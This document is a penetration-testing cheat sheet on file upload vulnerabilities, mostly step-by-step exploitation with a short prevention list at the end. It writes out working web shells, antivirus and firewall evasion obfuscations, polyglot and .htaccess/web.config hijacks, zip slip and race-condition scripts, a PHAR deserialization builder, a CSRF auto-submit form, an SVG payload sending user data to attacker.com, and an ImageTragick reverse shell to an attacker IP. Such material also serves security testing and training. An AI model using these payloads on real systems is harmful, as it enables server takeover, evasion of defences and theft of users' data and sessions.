## File Upload Vulnerabilities

- **What they are**
  - Security flaws allowing attackers to upload malicious files to a server
  - Occur when applications fail to properly validate uploaded files
  - Can enable complete server compromise through web shells
  - May allow overwriting critical files or executing arbitrary code
  - Sometimes exploitable without achieving remote code execution
  - Potentially affect any application that accepts file uploads
  - Considered high-impact vulnerabilities due to their exploitation potential

- **How they arise**
  - Insufficient validation of file extensions
  - Improper verification of file content/MIME types
  - Insecure handling of filenames (allowing path traversal)
  - Failure to enforce file size limitations
  - Reliance on client-side validation only
  - Insecure server configurations
  - Race conditions during file processing
  - Insufficient file content validation
  - Improper implementation of blacklists
  - Trusting user-supplied Content-Type headers
  - Failure to properly sanitize file metadata
  - Improper file storage practices

- **Impact**
  - Remote code execution via uploaded web shells
  - Access to sensitive data
  - Complete server compromise
  - File system traversal
  - Denial of service (disk space exhaustion)
  - Stored cross-site scripting (if uploads are displayed to users)
  - Server-Side Request Forgery (SSRF)
  - XML External Entity (XXE) attacks with XML uploads
  - Overwriting critical configuration files
  - Client-side attacks through JavaScript/HTML uploads
  - Database compromise via SQL injection
  - Pivoting to other systems in the internal network

- **Identifying upload functionality**
  - Look for file upload forms in the application
  - Check for API endpoints with upload functionality (often containing "upload", "import", "attachment" in the URL)
  - Review JavaScript for references to file uploads or FormData usage
  - Check profile picture/avatar change functionality
  - Document management systems
  - Media uploading features
  - Import/export functionality
  - Backup/restore features
  - Theme customization features
  - Customizable headers/logos
  - Support ticket attachments
  - Resume/CV upload on careers pages

- **Using Burp Suite for testing**
  - Capture upload requests with Burp Proxy
  - Use Burp Repeater to modify upload requests
  - Manipulate Content-Type headers and file content
  - Apply Burp Suite extensions:
    1. Upload Scanner for automated testing
    2. Content-Type Converter for MIME type manipulation
    3. Turbo Intruder for race condition testing
  - Test with Intruder for parameter fuzzing
  - Use Burp Collaborator for SSRF and XXE detection
  - Apply Burp's scanning profiles specific to file uploads
  - Observe responses for error messages that reveal server-side processing
  - Analyze file storage paths in responses

- **Creating malicious test files**
  - **Basic web shells**:
    - PHP: `<?php system($_GET["cmd"]); ?>`
    - JSP: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
    - ASP: `<% eval request("cmd") %>`
    - ASP.NET: `<% Response.Write(new System.Diagnostics.Process().Start("cmd.exe", Request.QueryString["cmd"])); %>`
  
  - **Anti-virus evasion techniques**:
    - Encode the payload (base64) with appropriate decoder
    - PHP: `<?php system(base64_decode("Y21kIC9jIGRpcg==")); ?>`
    - Split payload into concatenated strings: `<?php $a="sy"; $b="st"; $c="em"; $d=$a.$b.$c; $d($_GET['cmd']); ?>`
    - Use alternative function calls: `<?php $_GET['x']($_GET['y']); ?>`
    - Use character encoding tricks: `<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a($_GET[0]); ?>`
  
  - **Polyglot files**:
    - GIFAR (GIF + RAR): Begin with GIF89a header followed by payload
    - JPEG + PHP: Add PHP code to EXIF metadata: `exiftool -Comment="<?php system(\$_GET['cmd']);__halt_compiler(); ?>" image.jpg`
    - SVG + XSS: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
    - Valid PNG with PHP payload: Add PHP code after PNG end marker (IEND)
    - PDF + JavaScript: Create PDF with embedded JavaScript for XSS

- **Step-by-step exploitation techniques**

  - **Uploading basic web shells**
    1. **Simple PHP web shell**:
       - Step 1: Create a file called `shell.php` containing: `<?php system($_GET["cmd"]); ?>`
       - Step 2: Upload the file through the application's upload function
       - Step 3: If successful, locate the uploaded file (often in `/uploads/`, `/media/`, etc.)
       - Step 4: Access the file in a browser with a command: `https://vulnerable-site.com/uploads/shell.php?cmd=id`
       - Step 5: Verify code execution by checking the output
       - Example: `/uploads/shell.php?cmd=ls+-la` to list directory contents
       
    2. **One-liner file read shell**:
       - Step 1: Create a file with: `<?php echo file_get_contents('/etc/passwd'); ?>`
       - Step 2: Upload and access the file to read sensitive server files
       - Step 3: Extend to read application configuration files and source code
       - Step 4: Look for database credentials, API keys, and other secrets
       - Step 5: Use the information gathered for further exploitation
       - Example: Use `file_get_contents('../../../config.php')` to read configuration files

    3. **Advanced command shell with output formatting**:
       - Step 1: Create a more sophisticated shell:
       ```php
       <?php
       if(isset($_POST['cmd'])) {
           echo "<pre>";
           $cmd = ($_POST['cmd']);
           system($cmd);
           echo "</pre>";
       }
       ?>
       <form method="post">
       <input type="text" name="cmd" size="50">
       <input type="submit" value="Execute">
       </form>
       ```
       - Step 2: Upload the file to get a web-based command interface
       - Step 3: Use the form to execute commands with formatted output
       - Step 4: Leverage this shell to establish a more stable connection
       - Step 5: Pivot to a full reverse shell if possible
       - Example: Use `python -c 'import pty;pty.spawn("/bin/bash")'` for a better shell experience

  - **Bypassing extension filters**
    1. **Using alternative extensions**:
       - Step 1: Identify which extensions are being blocked
       - Step 2: Try alternative extensions for the same language:
         - PHP: `.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phpt`, `.pht`, `.phtml`, `.pgif`
         - ASP: `.asp`, `.aspx`, `.ashx`, `.asmx`, `.aspq`, `.axd`, `.cshtm`, `.cshtml`
         - JSP: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
       - Step 3: Upload file with alternative extension
       - Step 4: Access the file to verify execution
       - Step 5: If blocked, try another extension from the list
       - Example: Rename `shell.php` to `shell.phtml` and upload again

    2. **Manipulating file extension case**:
       - Step 1: Test case-sensitivity of the filter
       - Step 2: Try mixed-case versions of blocked extensions:
         - `shell.pHp`
         - `shell.PhP`
         - `shell.pHP`
       - Step 3: Upload file with case-manipulated extension
       - Step 4: Access the file to check if it executes
       - Step 5: Try different case combinations if needed
       - Example: Change `shell.php` to `shell.pHp` to bypass case-sensitive filters

    3. **Double extension technique**:
       - Step 1: Add an allowed extension after the blocked one:
         - `shell.php.jpg`
         - `shell.php.png`
         - `shell.php.gif`
       - Step 2: Try adding the blocked extension after an allowed one:
         - `shell.jpg.php`
         - `shell.png.php`
       - Step 3: Upload the file with double extension
       - Step 4: Check if the server processes the file based on the last or first extension
       - Step 5: Access the file to verify execution
       - Example: Rename `shell.php` to `shell.php.jpg` if the filter only checks for the last extension

    4. **Special character techniques**:
       - Step 1: Add special characters after the extension:
         - `shell.php%00`
         - `shell.php%20`
         - `shell.php%0d%0a`
         - `shell.php/`
         - `shell.php.\`
         - `shell.php#`
         - `shell.php?`
         - `shell.php:`
       - Step 2: Upload the file and observe if truncation occurs
       - Step 3: Check if nullbyte/space injection is handled properly
       - Step 4: Access the file to verify execution
       - Step 5: Try other special characters if needed
       - Example: If using `shell.php%00.jpg`, server might interpret this as `shell.php` due to null byte

  - **Bypassing content validation**
    1. **Manipulating Content-Type header**:
       - Step 1: Intercept the upload request with Burp Suite
       - Step 2: Locate the Content-Type header for your file
       - Step 3: Change it to an allowed type:
         - From: `Content-Type: application/x-php`
         - To: `Content-Type: image/jpeg` or `image/png`
       - Step 4: Forward the manipulated request
       - Step 5: Check if the file was accepted and access it
       - Example: Change header from `Content-Type: application/x-php` to `Content-Type: image/jpeg`

    2. **Creating valid image with embedded PHP code**:
       - Step 1: Start with a valid image file
       - Step 2: Add PHP code to the image metadata:
         - `exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg`
       - Step 3: Make sure the file still opens as an image
       - Step 4: Upload the modified image file
       - Step 5: Access the file with a .php or relevant extension
       - Example: Use `exiftool` to add PHP code to the Comment field of a JPEG

    3. **Creating polyglot GIF/PHP files**:
       - Step 1: Create a file with both GIF header and PHP code:
       ```
       GIF89a;
       <?php system($_GET['cmd']); ?>
       ```
       - Step 2: Save as shell.php or shell.gif depending on the filter
       - Step 3: Upload the file through the application
       - Step 4: Access the file with appropriate parameter
       - Step 5: Verify code execution
       - Example: Start file with `GIF89a;` magic bytes, followed by PHP code

    4. **Exploiting imperfect content validation**:
       - Step 1: Analyze how the server validates file contents
       - Step 2: Create a file that passes content checks but contains malicious code
       - Step 3: For image validation, create valid image with code after image data
       - Step 4: For signature validation, include proper magic bytes at the start
       - Step 5: Upload the file and test execution
       - Example: For PNG validation, create file with PNG header and footer with PHP in IDAT chunk

  - **Path traversal in file uploads**
    1. **Basic path traversal in filename**:
       - Step 1: Try uploading a file with path traversal in the name:
         - `../../../evil.php`
       - Step 2: Intercept the request with Burp Suite
       - Step 3: Modify the filename parameter to include traversal sequences
       - Step 4: Forward the request and check server response
       - Step 5: Access potential locations where the file might have been stored
       - Example: Change `filename="shell.php"` to `filename="../shell.php"` to store in parent directory

    2. **Encoded path traversal**:
       - Step 1: URL-encode the traversal characters:
         - `..%2F..%2F..%2Fevil.php`
         - `%2e%2e%2f%2e%2e%2f%2e%2e%2fevil.php`
       - Step 2: Try double encoding if needed:
         - `%252e%252e%252f%252e%252e%252f%252e%252e%252fevil.php`
       - Step 3: Submit with encoded traversal sequences
       - Step 4: Check for successful upload and test access
       - Step 5: Try variations if initial attempt fails
       - Example: Use `%2e%2e%2f` instead of `../` if basic traversal is blocked

    3. **Overwriting sensitive files**:
       - Step 1: Identify valuable files to target (configuration files, .htaccess)
       - Step 2: Create malicious version of the target file
       - Step 3: Use path traversal to specify the target location
       - Step 4: Upload the file and check if overwrite was successful
       - Step 5: Verify the impact of the modified file
       - Example: Upload `.htaccess` file with `AddType application/x-httpd-php .jpg` to make JPG files execute as PHP

    4. **Targeting custom file upload locations**:
       - Step 1: Analyze the application to find upload directory structure
       - Step 2: Test path traversal to reach writeable directories
       - Step 3: Target directories that are served by the web server
       - Step 4: Upload files to multiple locations systematically
       - Step 5: Test each potential location for successful execution
       - Example: If files are stored in `/var/www/uploads/[user]/`, try traversing to `/var/www/html/`

  - **Exploiting file upload race conditions**
    1. **Basic race condition exploitation**:
       - Step 1: Identify potential race condition in upload process
       - Step 2: Create a script to send a file upload request:
       ```python
       import requests
       
       url = "https://vulnerable-site.com/upload"
       files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
       data = {'submit': 'Upload'}
       
       r = requests.post(url, files=files, data=data)
       print(r.text)
       ```
       - Step 3: Create another script to immediately request the uploaded file:
       ```python
       import requests
       import threading
       import time
       
       def upload_file():
           # Same as above upload code
           
       def access_file():
           time.sleep(0.1)  # Small delay to ensure upload starts
           r = requests.get("https://vulnerable-site.com/uploads/shell.php?cmd=id")
           print(r.text)
           
       t1 = threading.Thread(target=upload_file)
       t2 = threading.Thread(target=access_file)
       
       t1.start()
       t2.start()
       ```
       - Step 4: Run the script multiple times to exploit the race condition
       - Step 5: Adjust timing parameters for successful exploitation
       - Example: If file is checked after upload, access it in the milliseconds between upload and validation

    2. **Multi-threaded race condition attacks**:
       - Step 1: Create a more sophisticated script with multiple threads:
       ```python
       import requests
       import threading
       import time
       
       def upload_file():
           # Upload code here
           
       def access_file():
           # Access code here
           
       threads = []
       # Create 5 upload threads
       for i in range(5):
           t = threading.Thread(target=upload_file)
           threads.append(t)
           
       # Create 20 access threads with different timing
       for i in range(20):
           t = threading.Thread(target=access_file)
           t.daemon = True
           threads.append(t)
           
       # Start all threads
       for t in threads:
           t.start()
           time.sleep(0.05)  # Small delay between thread starts
       ```
       - Step 3: Run the script to exploit race condition through multiple simultaneous attempts
       - Step 4: Check for successful command execution responses
       - Step 5: Fine-tune the timing and thread count based on results
       - Example: Bombard server with multiple upload/access attempts to increase race condition success

    3. **Exploiting deferred validation**:
       - Step 1: Identify applications that perform asynchronous validation
       - Step 2: Upload malicious file with valid headers/structure
       - Step 3: Locate the temporary storage location if possible
       - Step 4: Access the file immediately after upload
       - Step 5: Continue accessing until validation completes
       - Example: Some applications store files in `/tmp/uploads/` before moving to permanent location

  - **.htaccess upload techniques**
    1. **Creating custom .htaccess file**:
       - Step 1: Create an .htaccess file with directives to execute non-PHP files as PHP:
       ```
       AddType application/x-httpd-php .jpg
       AddType application/x-httpd-php .png
       AddType application/x-httpd-php .gif
       ```
       - Step 2: Upload the .htaccess file to the upload directory
       - Step 3: Upload malicious PHP code with an allowed extension (.jpg, .png)
       - Step 4: Access the file to verify execution of PHP code
       - Step 5: If successful, upload more sophisticated payloads
       - Example: Upload .htaccess then upload shell.jpg containing PHP code

    2. **Alternate configuration files**:
       - Step 1: For IIS servers, create web.config:
       ```xml
       <?xml version="1.0" encoding="UTF-8"?>
       <configuration>
           <system.webServer>
               <handlers accessPolicy="Read, Script, Write">
                   <add name="web_config" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
               </handlers>
               <security>
                   <requestFiltering>
                       <fileExtensions>
                           <remove fileExtension=".jpg" />
                       </fileExtensions>
                   </requestFiltering>
               </security>
           </system.webServer>
       </configuration>
       ```
       - Step 2: Upload web.config to the upload directory
       - Step 3: Upload ASP code with .jpg extension
       - Step 4: Access the .jpg file to verify ASP execution
       - Step 5: Extend to other allowed extensions if needed
       - Example: Upload web.config then evil.jpg containing ASP code to an IIS server

    3. **PHP.ini approach**:
       - Step 1: Create a custom php.ini file:
       ```
       auto_prepend_file=shell.jpg
       ```
       - Step 2: Upload the php.ini file to override server configuration
       - Step 3: Upload shell.jpg containing PHP code
       - Step 4: Access any PHP file in the same directory
       - Step 5: Verify that the code in shell.jpg is executed
       - Example: Upload php.ini with auto_prepend_file directive pointing to your payload file

  - **ZIP-based attacks**
    1. **Zip slip exploitation**:
       - Step 1: Create a zip file with files containing path traversal:
       ```bash
       echo '<?php system($_GET["cmd"]); ?>' > payload.php
       zip --symlinks malicious.zip ../../../../var/www/html/payload.php
       ```
       - Step 2: Upload the zip file to an application that extracts uploads
       - Step 3: If the application extracts without path validation, files will be placed outside the upload directory
       - Step 4: Locate and access the extracted files in the traversed location
       - Step 5: Verify code execution
       - Example: Create a zip with payload target: `../../../../../../var/www/html/shell.php`

    2. **Using evilarc tool**:
       - Step 1: Install evilarc tool: `git clone https://github.com/ptoomey3/evilarc.git`
       - Step 2: Create payload: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
       - Step 3: Generate malicious zip: `python evilarc.py -o unix -d 5 -p /var/www/html/ shell.php`
       - Step 4: Upload the generated zip file
       - Step 5: Test for successful traversal and file extraction
       - Example: Use evilarc to target `/var/www/html/` with 5 levels of traversal

    3. **Zip file with symlinks**:
       - Step 1: Create a symlink to a sensitive file:
       ```bash
       ln -s /etc/passwd link_to_passwd
       zip --symlinks malicious.zip link_to_passwd
       ```
       - Step 2: Upload the zip file to an application that extracts uploads
       - Step 3: If the application preserves symlinks during extraction, they will point to the target files
       - Step 4: Access the extracted symlink to read/modify the target file
       - Step 5: Use this technique to access sensitive configuration files
       - Example: Create symlinks to access `/etc/passwd`, `wp-config.php`, or application secrets

  - **Exploiting file upload for XSS**
    1. **SVG-based XSS**:
       - Step 1: Create an SVG file with embedded JavaScript:
       ```xml
       <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
         <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
       </svg>
       ```
       - Step 2: Upload the SVG file through the application
       - Step 3: If the SVG is displayed directly to users, the JavaScript will execute
       - Step 4: Extend the payload for more sophisticated attacks
       - Step 5: Try to steal cookies or session information
       - Example: Create SVG with `fetch('/api/user',{credentials:'include'}).then(r=>r.json()).then(r=>fetch('https://attacker.com/'+btoa(JSON.stringify(r))))`

    2. **HTML file upload for XSS**:
       - Step 1: Create an HTML file with JavaScript:
       ```html
       <html>
         <body>
           <script>alert(document.domain)</script>
         </body>
       </html>
       ```
       - Step 2: Upload the HTML file if allowed
       - Step 3: Access the file directly to verify XSS
       - Step 4: Enhance payload for session stealing or other attacks
       - Step 5: Target other users who might view the upload
       - Example: Create a fake login form in HTML to capture credentials

    3. **XSS in filename**:
       - Step 1: Create a file with XSS payload in the name:
       ```
       "><script>alert(1)</script>.jpg
       ```
       - Step 2: Upload the file to the application
       - Step 3: If filenames are displayed without proper encoding, XSS may trigger
       - Step 4: Check file galleries, download pages, and admin panels
       - Step 5: Extend with more elaborate payloads if successful
       - Example: Name file `"><img src=x onerror=alert(document.cookie)>.jpg`

  - **File upload for SSRF**
    1. **URL-based uploads**:
       - Step 1: Identify features that fetch remote files (profile pictures, imports)
       - Step 2: Try internal URLs in upload functions:
       ```
       http://localhost:8080/admin
       http://127.0.0.1/internal-api
       file:///etc/passwd
       ```
       - Step 3: Check responses for leaked internal content
       - Step 4: Scan internal ports and services
       - Step 5: Access restricted functionality via SSRF
       - Example: Set upload source to `http://localhost:8080/admin/users` to access admin interface

    2. **SVG-based SSRF**:
       - Step 1: Create an SVG file with XXE payload:
       ```xml
       <?xml version="1.0" encoding="UTF-8" standalone="no"?>
       <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
       <!DOCTYPE svg [
           <!ENTITY xxe SYSTEM "http://internal-service/api/users">
       ]>
       <svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
           <text font-size="16" x="0" y="16">&xxe;</text>
       </svg>
       ```
       - Step 2: Upload the SVG file
       - Step 3: If the server processes XML and renders the SVG, it may include the XXE content
       - Step 4: View the rendered SVG to see fetched internal resources
       - Step 5: Target various internal services and endpoints
       - Example: Use XXE payload to access `http://localhost:8080/admin/config`

- **Advanced techniques and special cases**

  - **PHAR deserialization attacks**
    1. **Exploiting PHAR for object injection**:
       - Step 1: Identify PHP applications vulnerable to deserialization
       - Step 2: Create a malicious PHAR file with serialized payload:
       ```php
       <?php
       class Vulnerable {
           public $data = "system('id');";
       }
       
       $obj = new Vulnerable();
       $phar = new Phar('exploit.phar');
       $phar->setStub('<?php __HALT_COMPILER(); ?>');
       $phar->addFromString('test.txt', 'test');
       $phar->setMetadata($obj);
       ?>
       ```
       - Step 3: Upload the PHAR file with an allowed extension (e.g., .jpg)
       - Step 4: Trigger file operations on the uploaded file using phar:// wrapper
       - Step 5: Verify successful deserialization and code execution
       - Example: If application uses `file_exists()` on uploaded files, request `phar://path/to/uploads/exploit.jpg/test.txt`

  - **File upload for CSRF bypass**
    1. **Using file uploads to bypass CSRF protections**:
       - Step 1: Identify applications with strict CSRF protections but file upload capabilities
       - Step 2: Create HTML/SVG file with auto-submitting form:
       ```html
       <form id="csrf" action="https://vulnerable-site.com/admin/action" method="POST">
         <input type="hidden" name="username" value="attacker" />
         <input type="hidden" name="role" value="admin" />
         <input type="submit" value="Submit" />
       </form>
       <script>document.getElementById("csrf").submit();</script>
       ```
       - Step 3: Upload the file to the application
       - Step 4: Trick admin/victim into viewing the file
       - Step 5: Verify if the CSRF action was performed
       - Example: Upload HTML file that submits form to change admin email/password

  - **ImageTragick exploitation**
    1. **Exploiting ImageMagick vulnerabilities**:
       - Step 1: Create a malicious MVG file:
       ```
       push graphic-context
       viewbox 0 0 640 480
       fill 'url(https://127.0.0.1/image.jpg"|bash -i >& /dev/tcp/attacker-ip/4444 0>&1|touch "test)'
       pop graphic-context
       ```
       - Step 2: Save with image extension (.jpg, .png)
       - Step 3: Upload the file to an application using ImageMagick
       - Step 4: Check for evidence of command execution (created files, connections)
       - Step 5: Test different ImageTragick payloads based on the environment
       - Example: Upload MVG file that writes to a web-accessible location and verify file creation

  - **File upload for XXE**
    1. **XXE via uploaded Office documents**:
       - Step 1: Create a malicious XML file:
       ```xml
       <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
       <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
       <test>&xxe;</test>
       ```
       - Step 2: Create or modify Office document (DOCX, XLSX) with this content
       - Step 3: Office files are ZIP archives, so unzip, modify XML files, rezip
       - Step 4: Upload the modified Office document
       - Step 5: Check for XXE vulnerabilities in document processing
       - Example: Modify word/document.xml in a DOCX file to include XXE payload

- **Detection evasion techniques**
  1. **Bypassing AV detection**:
     - Encode payloads using base64
     - Split strings to avoid signature detection
     - Use dynamic evaluation: `$a="ev";$b="al";$c=$a.$b;$c('phpinfo();');`
     - Use less common PHP execution functions: `$_REQUEST['x']($_REQUEST['y']);`
     - Use character encoding tricks: `chr(101).chr(118).chr(97).chr(108)`
     - Employ PHP7+ features and less-known syntax
     - Use comment/whitespace obfuscation

  2. **Avoiding WAF detection**:
     - Analyze WAF behavior by testing various payloads
     - Use different content-types: `text/plain` instead of `application/x-php`
     - Mix upper/lowercase in file extensions: `.PhP`, `.pHP`
     - Obfuscate payloads using encoding techniques
     - Try HTTP header manipulation to confuse WAF
     - Use valid nested file formats (polyglot files)
     - Test delayed execution techniques that bypass initial scanning

  3. **Avoiding size/dimension checks**:
     - Create valid images with minimal dimensions
     - Add payload after image data or in metadata
     - Keep files under size limits while including payloads
     - Use compression techniques to reduce file size
     - Split payload across multiple files if necessary
     - Use minimal but valid file format structures

- **Prevention and mitigation**
  1. **Implement proper file validation**:
     - Use whitelist for allowed file extensions
     - Verify file content (not just extension)
     - Implement proper Content-Type validation
     - Check file signatures/magic bytes
     - Validate file size and dimensions for images
     - Scan uploads with anti-virus software
     - Implement proper file naming policies (random names)
     - Validate filenames to prevent path traversal

  2. **Secure file storage practices**:
     - Store uploaded files outside web root
     - Use separate domains for user-uploaded content
     - Implement proper permissions on upload directories
     - Rename files to prevent overwriting
     - Store files in a database or object storage when possible
     - Use content delivery networks (CDNs) for isolation
     - Implement file access controls

  3. **Secure file serving techniques**:
     - Use proper Content-Disposition headers
     - Set appropriate Content-Type headers
     - Implement X-Content-Type-Options: nosniff
     - Use security headers like Content-Security-Policy
     - Sanitize file metadata before serving
     - Implement proper authentication for file access
     - Consider streaming files instead of direct linking

  4. **Additional security measures**:
     - Run server-side processes in isolated environments
     - Implement file upload rate limiting
     - Use multi-stage upload processes
     - Implement file integrity checks
     - Deploy web application firewalls
     - Regularly audit uploaded files
     - Keep image processing libraries updated
     - Use sandboxed environments for file processing
